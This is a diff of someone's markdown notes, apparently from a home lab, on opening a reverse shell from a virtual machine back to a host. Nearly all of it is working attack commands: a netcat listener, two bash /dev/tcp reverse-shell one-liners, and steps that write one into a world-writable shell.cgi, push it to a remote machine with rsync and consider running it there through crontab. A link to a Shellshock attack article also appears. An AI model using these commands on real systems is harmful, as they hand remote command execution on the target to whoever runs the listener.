@@ -24,26 +24,26 @@ HM
 - // sh >&196 receive commands on target, redirect output to the host machine
 - // sh 2>&196 redirect stderr to the host
 - // sh <&196 1>&196 2>&196 allow commands output to display on the target machine
-on HM: `nc –l 4444`
-on VM: `0<&196;exec 196<>/dev/tcp/192.168.0.xxx/4444; sh <&196 1>&196 2>&196`
+1. on HM: `nc –l 4444`
+2. on VM: `0<&196;exec 196<>/dev/tcp/192.168.0.xxx/4444; sh <&196 1>&196 2>&196`
 
 # 3 even better method
 https://medium.com/@hackbotone/shellshock-attack-on-a-remote-web-server-d9124f4a0af3
 - // >& <location> redirects stdout and stderr to be redirected to <location>
 - // 0<&1 redirects std in back to the shell
-on HM: `nc –l 4444`
-on VM: `/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1`
-copy it to the remote machine: `rsync -av shell.cgi sparky@kali:/home/sparky/desktop`	// change to use your machines details instead of sparky@kali						
+1. on HM: `nc –l 4444`
+2. on VM: `/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1`
+3. copy it to the remote machine: `rsync -av shell.cgi sparky@kali:/home/sparky/desktop`	// change to use your machines details instead of sparky@kali						
 
-## Elaborate a little bit --> create the script, set permissions
-on HM: `echo "/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1" > shell.cgi; chmod 777 shell.cgi`
+## To elaborate a little bit --> create the script, set permissions
+1. on HM: `echo "/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1" > shell.cgi; chmod 777 shell.cgi`
 
 ## copy the script to the remote machine
-rsync -av shell.cgi sparky@kali:/home/sparky/desktop
+2. rsync -av shell.cgi sparky@kali:/home/sparky/desktop
 
 ## now the remote machine just needs to run shell.cgi
 Sounds like Crontab could do this, or https://serverfault.com/questions/364040/how-to-execute-a-process-on-remote-linux-machine-without-ssh
-./shell.cgi
+3. ./shell.cgi
 
 # TODO
 - [ ] figure out how to make the script execute on the remote machine.
